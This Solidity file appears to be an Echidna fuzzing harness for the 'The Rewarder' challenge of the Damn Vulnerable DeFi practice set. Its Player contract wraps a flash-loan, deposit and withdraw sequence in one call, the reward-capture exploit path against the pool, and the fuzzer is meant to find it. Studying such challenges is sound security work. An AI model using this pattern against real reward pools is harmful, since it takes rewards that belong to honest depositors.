// @dev to run: ./toggle_forge_files.sh disable contracts/the-rewarder; echidna ./ --config contracts/the-rewarder/config.yaml --contract TheRewarderTest

pragma solidity ^0.8.0;

import { DamnValuableToken } from "../DamnValuableToken.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { AccountingToken } from "./AccountingToken.sol";
import { RewardToken } from "./RewardToken.sol";
import { FlashLoanerPool } from "./FlashLoanerPool.sol";
contract Player {
  DamnValuableToken public liquidityToken;
  TheRewarderPool public rewarderPool;
  FlashLoanerPool public flashLoanerPool;
  constructor (address _liquidityTokenAddress, address _rewarderPoolAddress, address _flashLoanerPoolAddress) {
    liquidityToken = DamnValuableToken(_liquidityTokenAddress);
    rewarderPool = TheRewarderPool(_rewarderPoolAddress);
    flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
  }

  function doDeposit(uint256 _amount) public {
    liquidityToken.approve(address(rewarderPool), _amount);
    rewarderPool.deposit(_amount);
  }

  function doWithdraw(uint256 _amount) public {
    rewarderPool.withdraw(_amount);
  }

  function doDistributeRewards() public {
    rewarderPool.distributeRewards();
  }

  function doFlashLoan(uint256 _amount) public {
    flashLoanerPool.flashLoan(_amount);
  }

  function receiveFlashLoan(uint256 _amount) public {
    doDeposit(_amount);
    doWithdraw(_amount);    
    liquidityToken.transfer(address(flashLoanerPool), _amount);
  }
}

contract TheRewarderTest {
  DamnValuableToken public liquidityToken;
  TheRewarderPool public rewarderPool;
  AccountingToken public accToken;
  RewardToken public rewardToken;
  FlashLoanerPool public flashLoanerPool;

  Player public player1;
  Player public playerAlice;

  address public deployer = address(0x10000);
  address public sender = address(0x11111);  

  uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

  constructor() payable {    
    assert(msg.sender == deployer);
    liquidityToken = new DamnValuableToken();
    rewarderPool = new TheRewarderPool(address(liquidityToken));
    
    accToken = rewarderPool.accToken();
    rewardToken = rewarderPool.rewardToken();
    
    flashLoanerPool = new FlashLoanerPool(address(liquidityToken));

    player1 = new Player(address(liquidityToken), address(rewarderPool), address(flashLoanerPool));
    playerAlice = new Player(address(liquidityToken), address(rewarderPool), address(flashLoanerPool));

    liquidityToken.transfer(address(flashLoanerPool), 1000 ether);
    liquidityToken.transfer(address(player1), 0.001 ether);
    liquidityToken.transfer(address(playerAlice), 1 ether);    

    playerAlice.doDeposit(1 ether);
    assert(accToken.balanceOf(address(playerAlice)) == 1 ether);

  }
  function player1_doFlashLoan(uint256 _amount) public {
    require( block.timestamp - rewarderPool.lastRecordedSnapshotTimestamp() >= REWARDS_ROUND_MIN_DURATION, "Rewards round duration is less than config");
    player1.doFlashLoan(_amount);
  }

  function check_reward_token_balance() public view {
    assert( rewardToken.balanceOf(address(player1)) < 99 ether );
  }

}
